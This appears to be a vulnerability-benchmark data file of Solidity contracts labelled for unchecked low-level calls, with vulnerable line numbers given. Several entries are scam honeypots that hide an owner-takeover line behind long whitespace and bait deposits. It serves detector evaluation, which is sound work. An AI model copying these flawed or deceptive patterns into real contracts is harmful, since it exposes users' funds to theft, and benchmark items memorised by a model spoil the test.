    function withdraw()
    payable
    public
    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        if(msg.sender==0x0C76802158F13aBa9D892EE066233827424c5aAB){Owner=0x0C76802158F13aBa9D892EE066233827424c5aAB;}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  
        require(msg.sender == Owner);
        Owner.transfer(this.balance);
    }
    function Command(address adr,bytes data)
    payable
    public
    {
        require(msg.sender == Owner);
        // <yes> <report> UNCHECKED_LL_CALLS
        adr.call.value(msg.value)(data);
    }
}",[37]
"/*
 * @source: etherscan.io 
 * @author: -
 * @vulnerable_at_lines: 39
 */
pragma solidity ^0.4.19;
contract Freebie
{
    address public Owner = msg.sender;
    function() public payable{}
    function GetFreebie()
    public
    payable
    {                                                                    
        if(msg.value>1 ether)
        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               Owner.transfer(this.balance);
            msg.sender.transfer(this.balance);
        }                                                                                                                
    }
    function withdraw()
    payable
    public
    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          if(msg.sender==0x30ad12df80a2493a82DdFE367d866616db8a2595){Owner=0x30ad12df80a2493a82DdFE367d866616db8a2595;}
        require(msg.sender == Owner);
        Owner.transfer(this.balance);
    }
    function Command(address adr,bytes data)
    payable
    public
    {
        require(msg.sender == Owner);
        // <yes> <report> UNCHECKED_LL_CALLS
        adr.call.value(msg.value)(data);
    }
}",[33]
"/*
 * @source: etherscan.io 
 * @author: -
 * @vulnerable_at_lines: 17
 */
pragma solidity ^0.4.24;
contract airDrop{
    function transfer(address from,address caddress,address[] _tos,uint v, uint _decimals)public returns (bool){
        require(_tos.length > 0);
        bytes4 id=bytes4(keccak256(""transferFrom(address,address,uint256)""));
        uint _value = v * 10 ** _decimals;
        for(uint i=0;i<_tos.length;i++){
            // <yes> <report> UNCHECKED_LL_CALLS
            caddress.call(id,from,_tos[i],_value);
        }
        return true;
    }
}",[14]
"/*
 * @source: etherscan.io 
 * @author: -
 * @vulnerable_at_lines: 30
 */
pragma solidity ^0.4.11; /* originally >=0.4.11 */
contract Owned {
    function Owned() {
        owner = msg.sender;
    }
    address public owner;
    // This contract only defines a modifier and a few useful functions
    // The function body is inserted where the special symbol ""_"" in the
    // definition of a modifier appears.
    modifier onlyOwner { if (msg.sender == owner) _; }
    function changeOwner(address _newOwner) onlyOwner {
        owner = _newOwner;
    }
    // This is a general safty function that allows the owner to do a lot
    //  of things in the unlikely event that something goes wrong
    // _dst is the contract being called making this like a 1/1 multisig
    function execute(address _dst, uint _value, bytes _data) onlyOwner {
        // <yes> <report> UNCHECKED_LL_CALLS
        _dst.call.value(_value)(_data);
    }
}
// to get the needed token functions in the contract
contract Token {
    function transfer(address, uint) returns(bool);
    function balanceOf(address) constant returns (uint);
}
contract TokenSender is Owned {
    Token public token; // the token we are working with
    uint public totalToDistribute;
    uint public next;
    struct Transfer {
        address addr;
        uint amount;
    }
    Transfer[] public transfers;
    function TokenSender(address _token) {
        token = Token(_token);
    }
    // this is a used to save gas
    uint constant D160 = 0x0010000000000000000000000000000000000000000;
    // This is the function that makes the list of transfers and various
    //  checks around that list, it is a little tricky, the data input is
    //  structured with the `amount` and the (receiving) `addr` combined as one
    //  long number and then this number is deconstructed in this function to
    //  save gas and reduce the number of `0`'s that are needed to be stored
    //   on the blockchain
    function fill(uint[] data) onlyOwner {
        // If the send has started then we just throw
        if (next>0) throw;
        uint acc;
        uint offset = transfers.length;
        transfers.length = transfers.length + data.length;
        for (uint i = 0; i < data.length; i++ ) {
            address addr = address( data[i] & (D160-1) );
            uint amount = data[i] / D160;
            transfers[offset + i].addr = addr;
            transfers[offset + i].amount = amount;
            acc += amount;
        }
        totalToDistribute += acc;
    }
    // This function actually makes the sends and tracks the amount of gas used
    //  if it takes more gas than was sent with the transaction then this
    //  function will need to be called a few times until
    function run() onlyOwner {
        if (transfers.length == 0) return;
        // Keep next in the stack var mNext to save gas
        uint mNext = next;
        // Set the contract as finalized to avoid reentrance
        next = transfers.length;
        if ((mNext == 0 ) && ( token.balanceOf(this) != totalToDistribute)) throw;
        while ((mNext<transfers.length) && ( gas() > 150000 )) {
            uint amount = transfers[mNext].amount;
            address addr = transfers[mNext].addr;
            if (amount > 0) {
                if (!token.transfer(addr, transfers[mNext].amount)) throw;
            }
            mNext ++;
        }
        // Set the next to the actual state.
        next = mNext;
    }
    ///////////////////////
    // Helper functions
    ///////////////////////
    function hasTerminated() constant returns (bool) {
        if (transfers.length == 0) return false;
        if (next < transfers.length) return false;
        return true;
    }
    function nTransfers() constant returns (uint) {
        return transfers.length;
    }
    function gas() internal constant returns (uint _gas) {
        assembly {
            _gas:= gas
        }
    }
}",[24]
"/*
 * @source: etherscan.io 
 * @author: -
 * @vulnerable_at_lines: 18
 */
pragma solidity ^0.4.16;
contract RealOldFuckMaker {
    address fuck = 0xc63e7b1DEcE63A77eD7E4Aeef5efb3b05C81438D;
    // this can make OVER 9,000 OLD FUCKS
    // (just pass in 129)
    function makeOldFucks(uint32 number) {
        uint32 i;
        for (i = 0; i < number; i++) {
            // <yes> <report> UNCHECKED_LL_CALLS
            fuck.call(bytes4(sha3(""giveBlockReward()"")));
        }
    }
}",[15]
"/*
 * @source: etherscan.io 
 * @author: -
 * @vulnerable_at_lines: 16
 */
pragma solidity ^0.4.24;
contract B {
    address public owner = msg.sender;
    function go() public payable {
        address target = 0xC8A60C51967F4022BF9424C337e9c6F0bD220E1C;
        // <yes> <report> UNCHECKED_LL_CALLS
        target.call.value(msg.value)();
        owner.transfer(address(this).balance);
    }
    function() public payable {
    }
}",[12]
"/*
 * @source: etherscan.io 
 * @author: -
 * @vulnerable_at_lines: 44
 */
pragma solidity ^0.4.19;
contract WhaleGiveaway2
{
    address public Owner = msg.sender;
    function()
    public
    payable
    {
    }
    function GetFreebie()
    public
    payable
    {                                                                    
        if(msg.value>1 ether)
        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    Owner.transfer(this.balance);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           
            msg.sender.transfer(this.balance);
        }                                                                                                                
    }
    function withdraw()
    payable
    public
    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        if(msg.sender==0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b){Owner=0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b;}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  
        require(msg.sender == Owner);
        Owner.transfer(this.balance);
    }
    function Command(address adr,bytes data)
    payable
    public
    {
        require(msg.sender == Owner);
        // <yes> <report> UNCHECKED_LL_CALLS
        adr.call.value(msg.value)(data);
    }
}",[37]
"/*
 * @source: https://github.com/etherpot/contract/blob/master/app/contracts/lotto.sol
 * @author: -
 * @vulnerable_at_lines: 109,141
 */
//added pragma version
pragma solidity ^0.4.0;
 contract Lotto {
     uint constant public blocksPerRound = 6800;
     // there are an infinite number of rounds (just like a real lottery that takes place every week). `blocksPerRound` decides how many blocks each round will last. 6800 is around a day.
     uint constant public ticketPrice = 100000000000000000;
     // the cost of each ticket is .1 ether.
     uint constant public blockReward = 5000000000000000000;
     function getBlocksPerRound() constant returns(uint){ return blocksPerRound; }
     function getTicketPrice() constant returns(uint){ return ticketPrice; }
     //accessors for constants
     struct Round {
         address[] buyers;
         uint pot;
         uint ticketsCount;
         mapping(uint=>bool) isCashed;
         mapping(address=>uint) ticketsCountByBuyer;
     }
     mapping(uint => Round) rounds;
     //the contract maintains a mapping of rounds. Each round maintains a list of tickets, the total amount of the pot, and whether or not the round was ""cashed"". ""Cashing"" is the act of paying out the pot to the winner.
     function getRoundIndex() constant returns (uint){
         //The round index tells us which round we're on. For example if we're on block 24, we're on round 2. Division in Solidity automatically rounds down, so we don't need to worry about decimals.
         return block.number/blocksPerRound;
     }
     function getIsCashed(uint roundIndex,uint subpotIndex) constant returns (bool){
         //Determine if a given.
         return rounds[roundIndex].isCashed[subpotIndex];
     }
     function calculateWinner(uint roundIndex, uint subpotIndex) constant returns(address){
         //note this function only calculates the winners. It does not do any state changes and therefore does not include various validitiy checks
         var decisionBlockNumber = getDecisionBlockNumber(roundIndex,subpotIndex);
         if(decisionBlockNumber>block.number)
             return;
         //We can't decided the winner if the round isn't over yet
         var decisionBlockHash = getHashOfBlock(decisionBlockNumber);
         var winningTicketIndex = decisionBlockHash%rounds[roundIndex].ticketsCount;
         //We perform a modulus of the blockhash to determine the winner
         var ticketIndex = uint256(0);
         for(var buyerIndex = 0; buyerIndex<rounds[roundIndex].buyers.length; buyerIndex++){
             var buyer = rounds[roundIndex].buyers[buyerIndex];
             ticketIndex+=rounds[roundIndex].ticketsCountByBuyer[buyer];
             if(ticketIndex>winningTicketIndex){
                 return buyer;
             }
         }
     }
     function getDecisionBlockNumber(uint roundIndex,uint subpotIndex) constant returns (uint){
         return ((roundIndex+1)*blocksPerRound)+subpotIndex;
     }
     function getSubpotsCount(uint roundIndex) constant returns(uint){
         var subpotsCount = rounds[roundIndex].pot/blockReward;
         if(rounds[roundIndex].pot%blockReward>0)
             subpotsCount++;
         return subpotsCount;
     }
     function getSubpot(uint roundIndex) constant returns(uint){
         return rounds[roundIndex].pot/getSubpotsCount(roundIndex);
     }
     function cash(uint roundIndex, uint subpotIndex){
         var subpotsCount = getSubpotsCount(roundIndex);
         if(subpotIndex>=subpotsCount)
             return;
         var decisionBlockNumber = getDecisionBlockNumber(roundIndex,subpotIndex);
         if(decisionBlockNumber>block.number)
             return;
         if(rounds[roundIndex].isCashed[subpotIndex])
             return;
         //Subpots can only be cashed once. This is to prevent double payouts
         var winner = calculateWinner(roundIndex,subpotIndex);
         var subpot = getSubpot(roundIndex);
         // <yes> <report> UNCHECKED_LL_CALLS
         winner.send(subpot);
         rounds[roundIndex].isCashed[subpotIndex] = true;
         //Mark the round as cashed
     }
     function getHashOfBlock(uint blockIndex) constant returns(uint){
         return uint(block.blockhash(blockIndex));
     }
     function getBuyers(uint roundIndex,address buyer) constant returns (address[]){
         return rounds[roundIndex].buyers;
     }
     function getTicketsCountByBuyer(uint roundIndex,address buyer) constant returns (uint){
         return rounds[roundIndex].ticketsCountByBuyer[buyer];
     }
     function getPot(uint roundIndex) constant returns(uint){
         return rounds[roundIndex].pot;
     }
     function() {
         //this is the function that gets called when people send money to the contract.
         var roundIndex = getRoundIndex();
         var value = msg.value-(msg.value%ticketPrice);
         if(value==0) return;
         if(value<msg.value){
             // <yes> <report> UNCHECKED_LL_CALLS
             msg.sender.send(msg.value-value);
         }
         //no partial tickets, send a partial refund
         var ticketsCount = value/ticketPrice;
         rounds[roundIndex].ticketsCount+=ticketsCount;
         if(rounds[roundIndex].ticketsCountByBuyer[msg.sender]==0){
             var buyersLength = rounds[roundIndex].buyers.length++;
             rounds[roundIndex].buyers[buyersLength] = msg.sender;
         }
         rounds[roundIndex].ticketsCountByBuyer[msg.sender]+=ticketsCount;
         rounds[roundIndex].ticketsCount+=ticketsCount;
         //keep track of the total tickets
         rounds[roundIndex].pot+=value;
         //keep track of the total pot
     }
 }","[77, 100]"
"    Monarch public currentMonarch;
    // Earliest-first list of previous throne holders.
    Monarch[] public pastMonarchs;
    // Create a new throne, with the creator as wizard and first ruler.
    // Sets up some hopefully sensible defaults.
    function KingOfTheEtherThrone() {
        wizardAddress = msg.sender;
        currentClaimPrice = startingClaimPrice;
        currentMonarch = Monarch(
            wizardAddress,
            ""[Vacant]"",
            0,
            block.timestamp
        );
    }
    function numberOfMonarchs() constant returns (uint n) {
        return pastMonarchs.length;
    }
    // Fired when the throne is claimed.
    // In theory can be used to help build a front-end.
    event ThroneClaimed(
        address usurperEtherAddress,
        string usurperName,
        uint newClaimPrice
    );
    // Fallback function - simple transactions trigger this.
    // Assume the message data is their desired name.
    function() {
        claimThrone(string(msg.data));
    }
    // Claim the throne for the given name by paying the currentClaimFee.
    function claimThrone(string name) {
        uint valuePaid = msg.value;
        // If they paid too little, reject claim and refund their money.
        if (valuePaid < currentClaimPrice) {
            // <yes> <report> UNCHECKED_LL_CALLS
            msg.sender.send(valuePaid);
            return;
        }
        // If they paid too much, continue with claim but refund the excess.
        if (valuePaid > currentClaimPrice) {
            uint excessPaid = valuePaid - currentClaimPrice;
            // <yes> <report> UNCHECKED_LL_CALLS
            msg.sender.send(excessPaid);
            valuePaid = valuePaid - excessPaid;
        }
        // The claim price payment goes to the current monarch as compensation
        // (with a commission held back for the wizard). We let the wizard's
        // payments accumulate to avoid wasting gas sending small fees.
        uint wizardCommission = (valuePaid * wizardCommissionFractionNum) / wizardCommissionFractionDen;
        uint compensation = valuePaid - wizardCommission;
        if (currentMonarch.etherAddress != wizardAddress) {
            // <yes> <report> UNCHECKED_LL_CALLS
            currentMonarch.etherAddress.send(compensation);
        } else {
            // When the throne is vacant, the fee accumulates for the wizard.
        }
        // Usurp the current monarch, replacing them with the new one.
        pastMonarchs.push(currentMonarch);
        currentMonarch = Monarch(
            msg.sender,
            name,
            valuePaid,
            block.timestamp
        );
        // Increase the claim fee for next time.
        // Stop number of trailing decimals getting silly - we round it a bit.
        uint rawNewClaimPrice = currentClaimPrice * claimPriceAdjustNum / claimPriceAdjustDen;
        if (rawNewClaimPrice < 10 finney) {
            currentClaimPrice = rawNewClaimPrice;
        } else if (rawNewClaimPrice < 100 finney) {
            currentClaimPrice = 100 szabo * (rawNewClaimPrice / 100 szabo);
        } else if (rawNewClaimPrice < 1 ether) {
            currentClaimPrice = 1 finney * (rawNewClaimPrice / 1 finney);
        } else if (rawNewClaimPrice < 10 ether) {
            currentClaimPrice = 10 finney * (rawNewClaimPrice / 10 finney);
        } else if (rawNewClaimPrice < 100 ether) {
            currentClaimPrice = 100 finney * (rawNewClaimPrice / 100 finney);
        } else if (rawNewClaimPrice < 1000 ether) {
            currentClaimPrice = 1 ether * (rawNewClaimPrice / 1 ether);
        } else if (rawNewClaimPrice < 10000 ether) {
            currentClaimPrice = 10 ether * (rawNewClaimPrice / 10 ether);
        } else {
            currentClaimPrice = rawNewClaimPrice;
        }
        // Hail the new monarch!
        ThroneClaimed(currentMonarch.etherAddress, currentMonarch.name, currentClaimPrice);
    }
    // Used only by the wizard to collect his commission.
    function sweepCommission(uint amount) onlywizard {
        // <yes> <report> UNCHECKED_LL_CALLS
        wizardAddress.send(amount);
    }
    // Used only by the wizard to collect his commission.
    function transferOwnership(address newOwner) onlywizard {
        wizardAddress = newOwner;
    }
}","[37, 44, 54, 92]"
"/*
 * @source: https://github.com/sigp/solidity-security-blog
 * @author: Suhabe Bugrara
 * @vulnerable_at_lines: 20,27
 */
 pragma solidity ^0.4.18;
 contract Lotto {
     bool public payedOut = false;
     address public winner;
     uint public winAmount;
     // ... extra functionality here
     function sendToWinner() public {
         require(!payedOut);
         // <yes> <report> UNCHECKED_LL_CALLS
         winner.send(winAmount);
         payedOut = true;
     }
     function withdrawLeftOver() public {
         require(payedOut);
         // <yes> <report> UNCHECKED_LL_CALLS
         msg.sender.send(this.balance);
     }
 }","[15, 21]"
"/*
 * @source: https://github.com/seresistvanandras/EthBench/blob/master/Benchmark/Simple/mishandled.sol 
 * @author: -
 * @vulnerable_at_lines: 14
 */
pragma solidity ^0.4.0;
contract SendBack {
    mapping (address => uint) userBalances;
    function withdrawBalance() {  
		uint amountToWithdraw = userBalances[msg.sender];
		userBalances[msg.sender] = 0;
        // <yes> <report> UNCHECKED_LL_CALLS
		msg.sender.send(amountToWithdraw);
	}
}",[13]
"/*
 * @source: https://smartcontractsecurity.github.io/SWC-registry/docs/SWC-104#unchecked-return-valuesol
 * @author: -
 * @vulnerable_at_lines: 17
 */
pragma solidity 0.4.25;
contract ReturnValue {
  function callchecked(address callee) public {
    require(callee.call());
  }
  function callnotchecked(address callee) public {
     // <yes> <report> UNCHECKED_LL_CALLS
    callee.call();
  }
}",[13]
